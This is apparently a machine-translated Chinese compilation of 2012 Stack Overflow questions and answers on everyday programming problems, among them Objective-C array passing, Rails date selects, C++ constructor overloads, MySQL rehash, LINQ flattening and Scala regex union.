    TestScoresArray = [[NSMutableArray alloc] init];//test data

    [TestScoresArray addObject: [NSMutableArray arrayWithObjects:@"Name : Bob",@" | Score : 134", nil]];//testData
    [TestScoresArray addObject: [NSMutableArray arrayWithObjects:@"Name : Roger",@" | Score : 12",nil]];//testData
    [TestScoresArray addObject: [NSMutableArray arrayWithObjects:@"Name : Ben",@"| Score : 34",nil]];//testData
    [super viewDidLoad];

    for(NSMutableArray *m in TestScoresArray)
    {
        NSLog(@"%@%@", m[0],m[1]);
   }

}

- (void)addNewScore
{

}

- (void)didReceiveMemoryWarning
{
    [super didReceiveMemoryWarning];

}
-  (NSInteger)tableView:(UITableView *)tableView
  numberOfRowsInSection:(NSInteger)section
{
    return 6;
}
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{

}
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier = @"myCell";

    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    if (cell == nil) {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];
    }

NSLog(@"%@",scoresArray);

    NSString *continent;
   NSMutableArray *country = [scoresArray objectAtIndex:indexPath.row];
    continent =[NSString stringWithFormat:@"%@ %@",[country objectAtIndex:0],[country objectAtIndex:1]];
cell.textLabel.text = continent;

 cell.accessoryType = UITableViewCellAccessoryDisclosureIndicator;

 return cell;
}

- (void)viewDidUnload {
    [self setTableView:nil];
    [super viewDidUnload];
}
@end 
```

* * *

这是 MainMenuScreen.h 的代码

```
#import <UIKit/UIKit.h>

@interface MainMenuScreen : UIViewController

- (IBAction)PlayGameBT:(id)sender;

- (IBAction)ViewScoresBT:(id)sender;

-(void)AddNewScore :(NSString *)userName :(int)score;//for PlayGame see .m

@end 
```

* * *

这是 MainMenuScreen.m 的代码

```
#import "MainMenuScreen.h"
#import "PlayGame.h"
#import "ImageTest.h"

@interface MainMenuScreen ()

@end

@implementation MainMenuScreen

//---------------------------------------------------------------------------------

//------------------------------------Variables------------------------------------

PlayGame *playGame;//PlayGameObject

NSMutableArray *gameDataArray;//Game Data Array (A array storying multable ImageTest Objects)

NSMutableArray *scoresArray;//<-------This need to go to view scores

//---------------------------------------------------------------------------------

//----------------------------------Constructors-----------------------------------

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
        // Custom initialization
    }
    return self;
}

- (void)viewDidLoad
{
    scoresArray = [[NSMutableArray alloc] init];

    [scoresArray addObject: [NSMutableArray arrayWithObjects:@"Bob",[NSNumber numberWithInt:134],nil]];//testData
    [scoresArray addObject: [NSMutableArray arrayWithObjects:@"Roger",[NSNumber numberWithInt:12],nil]];//testData
    [scoresArray addObject: [NSMutableArray arrayWithObjects:@"Ben",[NSNumber numberWithInt:34],nil]];//testData

    [super viewDidLoad];
    // Do any additional setup after loading the view from its nib.
}

//---------------------------------------------------------------------------------

//----------------------------------Add New Score----------------------------------
//a setter Method so Play Game can add the user name and score to the scoresArray
-(void)AddNewScore :(NSString *)userName :(int)score
{
    //adds user name and score to the array
    if (scoresArray != nil)
    {
        /*NSMutableArray *nameAndScore = [[NSMutableArray alloc] init];
        [nameAndScore addObject:userName];
        [nameAndScore addObject: [NSNumber numberWithInt:score]];//int needs to be converted before storing in an array
        [scoresArray addObject:nameAndScore];*/

        [scoresArray addObject: [NSMutableArray arrayWithObjects:userName,[NSNumber numberWithInt:score],nil]];

        for(NSMutableArray *m in scoresArray)
        {
            NSLog(@"%@%@", m[0],m[1]);//prints out the array in logs to make sure it is working
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:23:14.917

您可以通过在第二个 ScoresScreen.h 文件中定义一个数组属性来做到这一点，例如：

```
@interface ScoresScreen : UIViewController {
   NSArray *array;
}
@property(nonatomic, assign)NSArray *array; 
```

在 .m 文件中合成它就像

```
@synthesize array; 
```

现在在 MainMenuScreen.m 中分配它

```
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
{
   ScoresScreen *controller = [segue destinationViewController];
   controller.array = yourArray;
} 
```

**编辑**
.h

```
#import <UIKit/UIKit.h>

@interface ScoresScreen : UIViewController<UITableViewDataSource, UITableViewDelegate>{
     NSMutableArray *scoresArray;
}
@property (weak, nonatomic) IBOutlet UITableView *tableView;
@property (weak, nonatomic) NSMutableArray *scoresArray; //Added this line

@end 
```

.m

```
#import "ScoresScreen.h"
#import "MainMenuScreen.h"

@interface ScoresScreen ()

@end

@implementation ScoresScreen
@synthesize scoresArray; //Added this line
NSMutableArray *TestScoresArray;

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
   ...
....
.... 
```

你妈

```
#import "MainMenuScreen.h"
#import "PlayGame.h"
#import "ImageTest.h"

@interface MainMenuScreen ()

@end

@implementation MainMenuScreen

//---------------------------------------------------------------------------------

//------------------------------------Variables------------------------------------

PlayGame *playGame;//PlayGameObject

NSMutableArray *gameDataArray;//Game Data Array (A array storying multable ImageTest Objects)

NSMutableArray *scoresArray;//<-------This need to go to view scores

//---------------------------------------------------------------------------------

//----------------------------------Constructors-----------------------------------

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
        // Custom initialization
    }
    return self;
}

- (void)viewDidLoad
{
    scoresArray = [[NSMutableArray alloc] init];

    [scoresArray addObject: [NSMutableArray arrayWithObjects:@"Bob",[NSNumber numberWithInt:134],nil]];//testData
    [scoresArray addObject: [NSMutableArray arrayWithObjects:@"Roger",[NSNumber numberWithInt:12],nil]];//testData
    [scoresArray addObject: [NSMutableArray arrayWithObjects:@"Ben",[NSNumber numberWithInt:34],nil]];//testData

    [super viewDidLoad];
    // Do any additional setup after loading the view from its nib.
}

//---------------------------------------------------------------------------------

//----------------------------------Add New Score----------------------------------
//a setter Method so Play Game can add the user name and score to the scoresArray
-(void)AddNewScore :(NSString *)userName :(int)score
{
    //adds user name and score to the array
    if (scoresArray != nil)
    {
        /*NSMutableArray *nameAndScore = [[NSMutableArray alloc] init];
        [nameAndScore addObject:userName];
        [nameAndScore addObject: [NSNumber numberWithInt:score]];//int needs to be converted before storing in an array
        [scoresArray addObject:nameAndScore];*/

        [scoresArray addObject: [NSMutableArray arrayWithObjects:userName,[NSNumber numberWithInt:score],nil]];

        for(NSMutableArray *m in scoresArray)
        {
            NSLog(@"%@%@", m[0],m[1]);//prints out the array in logs to make sure it is working
        }
    }
}

    //added this method
    - (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
    {
       ScoresScreen *controller = [segue destinationViewController];
       controller.array = yourArray;
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T15:21:25.213

你可以用两种或三种不同的方式来做。除了瑞安已经评论过的内容。

1.  您可以在创建 ScoresScreen 时但在呈现 ScoresScreen 之前从 MainMenuScreen 传递它。

2.  您可以使 Array 成为 MainMenuScreen 的属性，该属性可以从导入它的任何类中检索。

3.  您可以有一个单独的 DataManager 类（通常是一个单例类）来管理数组，并且两个类都可以从那里获取数组。

另外：导入时，您应该导入 .h 文件，而不是像您在帖子中输入的 .m 文件，不确定这是您的代码中的拼写错误还是错误。如果您在 MainMenuScreen 中有一个方法或属性将返回数组，则需要在头文件 (.h) 中声明它，通过该头文件导入它的类知道它的存在。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-11T16:34:54.490

将数组移动到您的应用委托。要从任何类访问应用程序委托，请执行以下操作：

`#import "NameOfYourAppDelegate.h"`

在文件的顶部，和

`NameOfYourAppDelegate *appDelegate = [UIApplication sharedApplication].delegate`

你想在哪里使用它。

# ruby-on-rails - 我想在为客户输入信息时添加出生日期

> ID：13822719
> 
> 赞同：0
> 
> 时间：2012-12-11T15:13:57.593
> 
> 标签：ruby-on-rails, date

嗨，我在 Rails 上使用 ruby​​，当我输入出生日期时，我的出生日期只是从 2007 年到 2012 年，我的数据库上有这个命令，我加粗了给我错误的那个，这是我需要的拥有所有选项来选择出生日期，当然也可以在未来选择它们

```
class CreatePacientes < ActiveRecord::Migration
  def change
    create_table :pacientes do |t|
      t.string :cedula
      t.string :nombre
      t.string :apellido1
      t.string :apellido2
      **t.date :fecha_nacimiento**
      t.string :genero
      t.string :estado_civil
      t.string :provincia
      t.string :canton
      t.string :distrito
      t.text :otras_senas
      t.string :telefono_casa
      t.string :telefono_celular
      t.string :correo_electronico
      t.string :nacionalidad
      t.integer :anos_estudio
      t.string :profesion
      t.string :ocupacion

      t.timestamps
    end
  end
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T16:41:59.217

如果您查看[helper的](http://api.rubyonrails.org/classes/ActionView/Helpers/DateHelper.html#method-i-date_select)[文档`date_select`](http://api.rubyonrails.org/classes/ActionView/Helpers/DateHelper.html#method-i-date_select)，您会看到它接受以下两个选项：

```
:start_year - Set the start year for the year select. Default is Time.now.year - 5.

:end_year - Set the end year for the year select. Default is Time.now.year + 5. 
```

您看到的是默认值。虽然我不确定为什么你的最大值是 2012 年，而不是 2017 年，因为它应该是 +/- 5 年。无论如何，尝试通过限制以获得您需要的范围。`date_select`或者如果您需要输入任何年份，请不要使用。

# c - 打印helloworld需要条件

> ID：13822722
> 
> 赞同：0
> 
> 时间：2012-12-11T15:14:08.543
> 
> 标签：c

我想同时打印 Hello 和 world。那么“条件”应该是什么，以便以下代码段打印 HelloWorld

```
if "condition"
printf ("Hello");
else
printf("World"); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:15:02.247

它不是那样工作的...... `if`/`else`是其中之一。不是都。

如果你想有条件地做不止一件事，它必须是这样的：

```
int i =2;
if (i == 2)
    printf("Hello");
if (i > 0)
    printf("World"); 
```

这些是并发`if`的，每次您点击一个时都会评估相同的变量。在这种情况下，您会得到`HelloWorld`，因为这两个条件都成立。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T15:17:23.687

根据您的问题，您根本不需要条件。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-11T15:20:35.277

*不可能*。要么`if`要么`else`。

但是**等等**，邪恶[`goto`](http://xkcd.com/292/)想说点什么：

```
//sg
#include <stdio.h>

int main()
{

    if(1)
    {
    printf("Hello");
    goto evil;
    }
    else
    {
    evil:
    printf(" World");
    }
        return 0;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-11T15:15:18.147

如果您两次调用它并翻转第二次调用的条件，它只会同时执行这两种操作。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-11T15:19:01.923

试试这个：

```
switch (condition) {
    case 0: 
    case 1:
        printf("Hello");
        printf("World");
        break;
} 
```

这将在条件为 0 或 1 的情况下执行“HelloWorld”。 if/else 处理互斥事件（处理一种情况或另一种情况，但绝不同时处理两者）。

# mysql - MySQL 在“rehash”命令上永远挂起

> ID：13822724
> 
> 赞同：2
> 
> 时间：2012-12-11T15:14:17.287
> 
> 标签：mysql, hash, autocomplete, freeze

我们有一个 MySQL 服务器，其中运行着多个数据库，用于不同类型的数据。其中之一是 wordpress 数据库。

我可以连接好，“显示数据库”和“使用苹果”，“使用橙子”等（用水果代替我们的实际数据库）但是当我“使用 wordpress”而不是“数据库更改”时，我得到

```
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A 
```

果然，如果我用一个额外的 -A 标志启动 mysql，一切似乎都可以工作。然后我可以“使用 wordpress”并查看数据。

如果我用 -A 启动它并执行“使用 wordpress”它会起作用，那么我会执行“rehash”并且它会挂起。

有人见过这个吗？我能做些什么呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-07-02T00:01:48.933

MySQL 命令行客户端提供数据库/表/列名称补全：也就是说，当您开始输入名称并按`Tab`时，名称完成。为此，客户端会构建一个数据库、表和列名称的哈希，当您调用完成时它会查询这些哈希。

如果命令行客户端在启用[自动重新](http://dev.mysql.com/doc/refman/5.5/en/mysql-command-options.html#option_mysql_auto-rehash)散列的情况下启动，它会在您连接到数据库时自动构建完成散列，并使其保持最新。对于大型数据库，这可能需要一些时间。使用`--no-auto-rehash`( ) 启动客户端时，不会构建散列，并且在您手动构建散列（使用或）`-A`之前无法完成。这减少了启动时间，尤其是对于大型数据库。`rehash``\#`

因此，在大型数据库上散列需要相当长的时间是正常的。`-A`当您从启用自动重新散列开始时（即没有，或使用`-A`and then `rehash`） ，这就是您似乎正在经历的事情。对于小型数据库（`apples`在`oranges`您的示例中）它并不明显，但对于大型数据库（`wordpress`）它很慢。我使用的一些替代方案：

*   不要重复
*   在哈希建立时喝杯咖啡
*   使用可以更快完成的不同客户端

# c# - await 方法中的取消令牌

> ID：13822726
> 
> 赞同：5
> 
> 时间：2012-12-11T15:14:24.210
> 
> 标签：c#, async-await, async-ctp, cancellation-token

在任务的构造函数中放置令牌有很多原因，这里提到： [任务构造函数中的取消令牌：为什么？](https://stackoverflow.com/questions/3712939/cancellation-token-in-task-constructor-why)

使用关键字 async / await，它是如何工作的？例如我下面的代码：

```
public async Task MethodAsync(CancellationToken token)
{
  await Method01Async();
  await Method02Async();
} 
```

虽然它是一个异步过程。我很快就使用了“Task.StartNext”或“Task.Run”或“新任务”。为了能够指定我的取消令牌，我该怎么做？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-11T15:31:10.000

您不应该在方法中使用`Task`构造函数。`async`通常，您只想传递`CancellationToken`下去，如下所示：

```
public async Task MethodAsync(CancellationToken token)
{
  await Method01Async(token);
  await Method02Async(token);
} 
```

# c++ - 带有 bool 参数的构造函数总是用 _T("...") 调用？

> ID：13822730
> 
> 赞同：1
> 
> 时间：2012-12-11T15:14:34.167
> 
> 标签：c++, unicode, constructor

我的程序中有一个奇怪的行为。我写了一个总是失败的测试。在调试时，我看到了一些我不明白的东西：

我有一些多个构造函数，但是如果我通过 _T() 传递 unicode，总是会调用这个构造函数：

```
IsNullable(bool isNullable)
    : m_bIsNullabe(isNullable), Flag(eNullAllowed)
{}; 
```

这是我调用构造函数的方式：

```
... = new IsNullable(_T("N")); 
```

奇怪的是，上面的 bool Constructor 总是被调用......
为什么会这样？如果有人知道，我会很高兴的！

贪婪，克莱门斯

编辑：

这个构造函数应该被调用：

```
IsNullable(wchar_t isNullable)
    : Flag(eNullAllowed)
{...}; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-11T15:22:06.117

您要调用的构造函数采用`wchar_t`字符，而不是指向宽字符串的指针。称它为：

```
IsNullable( L'N' ); 
```

请注意，我没有使用`_T`宏，因为您的构造函数参数类型是`wchar_t`并且它不取决于`UNICODE`符号是否已定义。所以在这种情况下不需要那个宏。

调用另一个构造函数的原因是字符串字面量，类型`const wchar_t[2]`（假设`_T`宏扩展为`L"N"`）衰减为 a `const wchar_t *`，然后隐式转换为 a `bool`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T15:22:17.283

`_T("N")`不是 a `wchar_t`，而是一个宽字符串文字，实际上是一个指针。没有从它到 a`wchar_t`的转换，但是有一个到 的转换`bool`。也许你的意思是

```
new IsNullable(_T('N')) 
```

# c - “错误：链接器命令失败，退出代码”用于使用 crypt 函数

> ID：13822732
> 
> 赞同：0
> 
> 时间：2012-12-11T15:14:39.280
> 
> 标签：c, encryption, crypt

我正在尝试使用`crypt`这样的函数（我是 C 新手，这只是为了学习）

```
#include<stdio.h>
#define _XOPEN_SOURCE
#include <unistd.h>

char *crypt(const char *key, const char *salt);

int main()
{
    char* key="ilya";
    char* salt="xx";

    char* password=(char*)crypt(key, salt);

    printf("%s\n", password);

    return 0;
} 
```

我使用它编译它`make filename` ，我得到以下错误：

```
/home/bla/password.c:20: undefined reference to `crypt'
clang: error: linker command failed with exit code 1 (use -v to see invocation) 
```

这是为什么？

（我知道这是一种非常糟糕的加密方式，这只是为了学习目的）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:39:52.113

`gcc file.c -o file -lcrypt`如果您正在运行 Linux，请尝试链接 libcrypt 库。

您可以`(char*)`从调用中删除强制转换`crypt()`，它已经返回 a`char *`以及`crypt()`函数的声明，因为它已经从`unistd.h`.

我也建议你改变这个：

```
char *key
char *salt 
```

至

```
const char *key
const char *salt 
```

由于它们指向只读内存，`SIGSEGV`如果您尝试修改它们指向的内容，则会产生（分段错误信号）。

# ruby-on-rails - Rails 3 上的 404 错误部署到 AWS...很好，除了 EB 没有将 /ondeck 复制到 /current

> ID：13822738
> 
> 赞同：8
> 
> 时间：2012-12-11T15:15:03.060
> 
> 标签：ruby-on-rails, ruby, amazon-web-services, http-status-code-404, amazon-elastic-beanstalk

当我部署我的 rails 应用程序时，我遇到了一些导致 nginx 1.2.3 404 错误的错误。

在部署期间，EB 说：“错误：某些实例未响应命令。未收到来自 [i-a054e9de] 的响应。”

我可以登录到我的 EC2 并在 var/app "mv ondeck to current" 然后 "touch current/tmp/restart.txt" 然后应用程序将正确部署并正常工作。它具有所有依赖项并正确连接到 RDS 数据库。

问题是：

*如何让 aws 服务器（弹性 beantalk）进行最终部署步骤，将 ondeck 复制到当前？*

我的配置文件中是否缺少某些内容？EB配置中是否有我不小心更改的设置？

顺便说一句，直到最近出现这个问题之前，一切都运行良好......任何想法都值得赞赏。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T15:25:08.963

有一次，我做了一个 EB“重建部署”，它从弹性负载均衡器中删除了支持 https: 的端口 443 设置。

当我将 443 添加回平衡器时，部署开始正常工作......即它将完成部署，并从 ondeck 复制到当前。问题似乎已经解决，尽管我无法解释为什么这是必要的。

# dns - github页面自定义域

> ID：13822740
> 
> 赞同：0
> 
> 时间：2012-12-11T15:15:06.417
> 
> 标签：dns, github-pages

我对制作个人页面非常陌生。

我想为我的 github 页面设置一个自定义域。我在 apache 服务器上有一个帐户，其 url 类似于“server/~username”，我希望这个地址重定向到我的 github 页面，并且这个地址出现在我的 github 页面中。

我按照 github 帮助页面上的说明进行操作，在添加包含“server/~username”的 CNAME 文件后，我遇到了 Bad CNAME 失败。

这是可能吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:22:13.720

`server`除了将子域指向位置（部分）之外，CNAME DNS 记录不允许任何其他操作。该`~username`部分不是域的一部分，因此不能添加到`CNAME`记录中。

我很确定你想做的事情是不可能的。

编辑：如果您完全控制域，则可以创建一个子域并将其指向 github，因此`example.com/~username`您可以拥有`username.example.com`. 那会奏效。

# php - PHP 通过文件名的一部分定位存储的文件

> ID：13822745
> 
> 赞同：0
> 
> 时间：2012-12-11T15:15:17.770
> 
> 标签：php, image, file, storage, locate

朋友们。我需要找到一个文件，该文件存储在我的站点中，同时使用 php 并使用其名称的一部分找到它。我无法通过它的全名找到它，因为 php 文件不知道它的扩展名。它可能是png，也可能是jpg。

我怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:18:01.280

你会想看看[`glob`](http://php.net/glob)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T15:18:08.120

你可以使用[`glob()`](http://php.net/glob)

这是一个例子：

```
<?php

foreach(glob("path/to/files/imagename.*") as $file)
{
    // do something with the file here
    echo $file;
} 
```

# sql - sql自动更新

> ID：13822747
> 
> 赞同：1
> 
> 时间：2012-12-11T15:15:29.177
> 
> 标签：sql, sql-server, database, sql-server-2008, tsql

我有这个视图：创建视图为

```
SELECT
         p.pr_id
        ,p.arenda
        ,p.PlotArea
        ,p.OwnershipTitle
        ,p.Price
        ,p.NotaryCosts
        ,p.AgentFee
        ,p.CtrNO
        ,isnull(p.Price,0)-isnull(a.Price,0) as Diferente
        ,isnull(p.Price,0)+isnull(p.NotaryCosts,0)+isnull(p.AgentFee,0) as TotalCosts

from  nbProcuri p
      left JOIN nbAchizitii a
      ON p.PlotArea = a.PlotArea and p.CtrNo=a.CtrNo
where a.CtrNO is null and a.PlotArea is null 
```

我想将这两个表与另一个名为 Cadastrial 的表相关联，其中我还有一个名为 PlotArea 的列。如果 p.PlotArea=c.PlotArea ，则 p.arenda 列应使用值“yes”更新自身，否则以 no 填充。这可能以某种方式吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:19:46.120

像这样：

```
UPDATE p
SET p.arenda = CASE WHEN p.PlotArea IS NULL THEN 'no' -- For not matched 
                    ELSE 'yes' -- for matched
               END
FROM nbProcuri p
LEFT JOIN Cadastrial c ON p.PlotArea = c.PlotArea
LEFT JOIN nbAchizitii a
      ON p.PlotArea = a.PlotArea and p.CtrNo = a.CtrNo
WHERE a.CtrNO IS NULL 
  AND a.PlotArea IS NULL; 
```

# c++ - 如何在 OpenCV 中使用 16 位灰度？

> ID：13822748
> 
> 赞同：6
> 
> 时间：2012-12-11T15:15:28.973
> 
> 标签：c++, opencv, graphics

我找不到这些问题的答案：

1.  我可以使用 OpenCV 显示 16 位灰度图片吗？我尝试过`imshow()`，但 OpenCV 创建的窗口上没有出现任何内容。

2.  如何将 16 位灰度图片转换为 B5G6R5 图片？`cv::Mat`为了存储这个结构，我应该创建什么参数？我试过`cv::cvtColor(m_cvTmp, tmp, CV_GRAY2BGR565)`了，但这个功能一直崩溃。[关于杂项图像转换](http://opencv.willowgarage.com/documentation/cpp/miscellaneous_image_transformations.html)的文档并没有给出答案。

PS：我要处理的图像已经在内存中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T18:47:41.573

根据文档`imshow`，它会自动将 16 位灰度缩放为 8 位，以便在屏幕上显示。我使用以下程序对此进行了测试：

```
#include <iostream>

#include "opencv2/core/core.hpp"
#include "opencv2/imgproc/imgproc.hpp"
#include "opencv2/highgui/highgui.hpp"

using namespace std;

int main(int argc, char *argv[]) {
    cv::Mat image;
    image = cv::imread("pic2.jpg");

    if (!image.data) {
        std::cout << "Image file not found\n";
        return 1;
    }

    cv::cvtColor(image, image, CV_BGR2GRAY);
    cv::Mat pic16bit;
    image.convertTo(pic16bit, CV_16U, 255); //convert to 16-bit by multiplying all values by 255

    // create image window named "asdfasdf"
    cv::namedWindow("asdfasdf");
    // show the image on window
    cv::imshow("asdfasdf", pic16bit);
    // wait for key
    cv::waitKey(0);

    return 0;
} 
```

它按预期显示了灰度图像。因此，如果您只是得到一个空白窗口，我的猜测是您从其他库到 cv::Mat 的转换无法正常工作。例如，当我第一次尝试从 8 位转换为 16 位时，我得到了全黑图像，因为我忘记将所有 8 位值乘以 255。

作为调试的第一步，我会尝试在 16 位灰度 cv::Mat 中显示部分或全部值。

此外，作为一般规则，如果您的问题中只有一个问题，则 Stack Overflow 效果最好。当有多个问题时，您最终会得到多个有效答案，但您只能接受其中一个。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T15:55:21.353

1）你必须看看这个[文档](http://docs.opencv.org/doc/tutorials/introduction/display_image/display_image.html)。

您的代码将如下所示：

```
Mat imageGrey = imread("<image_name>", CV_LOAD_IMAGE_GRAYSCALE); 
```

2)

```
Mat imageGrey = imread("<image_name>", CV_LOAD_IMAGE_GRAYSCALE);
Mat imageBGR;
cvtColor(imageGrey, imageBGR, CV_GRAY2BGR565); 
```

它有效吗？

# c# - 如何在多维数组上使用 LINQ 来“展开”数组？

> ID：13822750
> 
> 赞同：12
> 
> 时间：2012-12-11T15:15:36.943
> 
> 标签：c#, .net, linq, multidimensional-array, jagged-arrays

考虑以下数组：

`int[,] numbers = new int[3, 2] { { 2, 1 }, { 3, 4 }, { 6, 5 } };`

我想使用 LINQ 构造一个数字为 2、1、3、4、6、5 的 IEnumerable。

最好的方法是什么？

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-12-11T15:22:02.783

也许很简单：

```
var all = numbers.Cast<int>(); 
```

[**演示**](http://ideone.com/yoXQZD)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-12-11T15:29:32.447

怎么样：

```
Enumerable
    .Range(0,numbers.GetUpperBound(0)+1)
    .SelectMany(x => Enumerable.Range(0,numbers.GetUpperBound(1)+1)
    .Select (y =>numbers[x,y] )); 
```

或整理。

```
var xLimit=Enumerable.Range(0,numbers.GetUpperBound(0)+1);
var yLimit=Enumerable.Range(0,numbers.GetUpperBound(1)+1);
var result = xLimit.SelectMany(x=> yLimit.Select(y => numbers[x,y])); 
```

编辑修订问题....

```
var result = array.SelectMany(x => x.C); 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-12-11T15:18:51.020

使用简单的 foreach 从二维数组中获取数字：

```
int[,] numbers = new int[3, 2] { { 2, 1 }, { 3, 4 }, { 6, 5 } };
foreach(int x in numbers)
{
   // 2, 1, 3, 4, 6, 5.
} 
```

LINQ（将 Linq 用于您的初始任务是一个很大的开销，因为将创建 OfTypeIterator 的 CastIterator（Tim 的答案）而不是简单的迭代数组）

```
IEnumerable<int> query = numbers.OfType<int>(); 
```

# regex - Scala 正则表达式联合

> ID：13822757
> 
> 赞同：8
> 
> 时间：2012-12-11T15:16:01.257
> 
> 标签：regex, scala

在 Ruby 中，如果我有两个正则表达式，我可以创建另一个像这样的正则表达式：

```
a = /\d+/ # Matches digits
b = /\s+/ # Matches whitespaces
c = Regexp.union(a, b) # Matches sequences that consist only of digits or only of whitespaces 
```

我想在 Scala 中做同样的事情，但我不知道如何做到这一点。请注意，我并不是在要求一种语法来创建字符类的联合，就像`(\d+)|(\s+)`在前面的示例中那样，我真的在寻找一种可能性，可以从两个给定的正则表达式创建一个新的正则表达式。

实际上，最后，我不会只为两个正则表达式而是大量。我不关心分组或任何事情，我只想知道字符串是否与给定正则表达式列表中的一个匹配。我可以在一个循环中检查所有这些，但这太低效了，这就是为什么我需要一个正则表达式来检查联合。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-11T16:11:57.053

Scala 使用基于类的 Java 正则表达式引擎`java.util.regex.Pattern`。 `Pattern`只有一种可以创建正则表达式的方法：

```
public static Pattern compile(String regex) 
```

就是这样，Scala 没有给你任何相关的增强。

但是你可以做的一件事是在 match 语句中使用内置的联合，这里显示了捕获组，以防你想从字符串中提取一些东西：

```
val Dig = """(\d+)""".r
val Wsp = """(\s+)""".r

scala> "45" match { case Dig(_) | Wsp(_) => println("found"); case _ => } 
```

成立

```
scala> "   " match { case Dig(_) | Wsp(_) => println("found"); case _ => } 
```

成立

如果你真的想要一个组合的正则表达式，你必须在字符串级别进行。`Pattern`您可以使用 Scala 正则表达式获取 java `.pattern`，然后另一个`.pattern`获取字符串。大多数正则表达式都可以安全地包装起来`(?:)`以获得非捕获块，因此您可以像这样组合：

```
val Both = ("(?:"+Dig.pattern.pattern+")|(?:"+Wsp.pattern.pattern+")").r 
```

但是，内部的任何捕获组*都*将被表示，但未使用的分支将是`null`（不完全是编写惯用 Scala 的好方法，但无论如何，这是 Java 使用的）：

```
scala> "2" match { case Both(d,w) => if (w!=null) println("white") else println(d) }
2

scala> " " match { case Both(d,w) => if (w!=null) println("white") else println(d) }
white 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T17:33:27.637

如果你想组合和重用正则表达式部分，我写了一个[REL](https://github.com/Imaginatio/REL/)库/DSL 来做这件事。您的案例用法示例：

```
import fr.splayce.rel._
import Implicits._

val a: RE = "\\d+"
val b: RE = "\\s+"
val c: RE = a | b 
```

`c`有一个`r`获取 Regex 对象的方法。它也在 中`Implicits`，因此您可以将其用作正则表达式，例如`c findAllIn someText`。如果需要，它将自动包装`a`和`b`非捕获组。

如果你有一组正则表达式，你可以这样做`reduceLeft`：

```
val regexes: List[RE] = List("a", "b", "c")
regexes.reduceLeft(_ | _) 
```

附带说明：

*   如果你导入`Symbols._`，你有一些简短的符号，比如`\d`和`\s`
*   它实现了大多数常用的正则表达式操作，以实现最大的可重用性

因此，使用 REL，您可以将第一个示例直接编写为：

```
val c = δ.+ | σ.+ 
```

它还提供了重用和组合相关提取器的方法。

如果您更喜欢香草斯卡拉，那么我对 Rex Kerr 的回答没有什么要补充的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-09-13T05:36:22.757

@akauppi 如果您想要一个正则表达式列表来匹配给定的字符串，您可以执行以下操作：

```
val regexes = List("\\d+".r, "\\s+".r, "a".r)
val single  = s"(${regexes.mkString("|")})".r
"123" match {
  case single(_*) = println("match")
  case _ => println("no match")
}
// above prints: match

"123  " match {
  case single(_*) = println("match")
  case _ => println("no match")
}
// above prints: no match 
```

利用正则表达式列表的最佳方法是使用正则表达式表示法。这真的和说的一样

```
val single = "(\\d+|\\s+|a)".r 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-01-20T11:24:07.680

虽然这些答案可能有效，但它们可能有点过时或过于复杂。

```
val reg1 = "\\d+".r
val reg2 = "\\s+".r
val reg3 = s"${reg1}{$reg2}".r
"123  " match { 
    case reg3(_*) => println("match")
    case _ => println("no match")
 } 
```

# c++ - 函数中的前向声明

> ID：13822764
> 
> 赞同：1
> 
> 时间：2012-12-11T15:16:15.417
> 
> 标签：c++, c

我在函数中使用前向声明时遇到问题。通常在全局范围内，我们可以使用使用`extern`关键字声明的未定义变量的地址。看一个简单的例子。

```
typedef struct Id {
    int a;
}  xIdRec;

typedef xIdRec* IdN;

typedef struct ChId{
    int a;
    IdN* b;
}  ChIdRec;

extern ChIdRec Evn;
IdN Arr[] = {(IdN)&Evn};
ChIdRec Evn = {8, Arr}; 
```

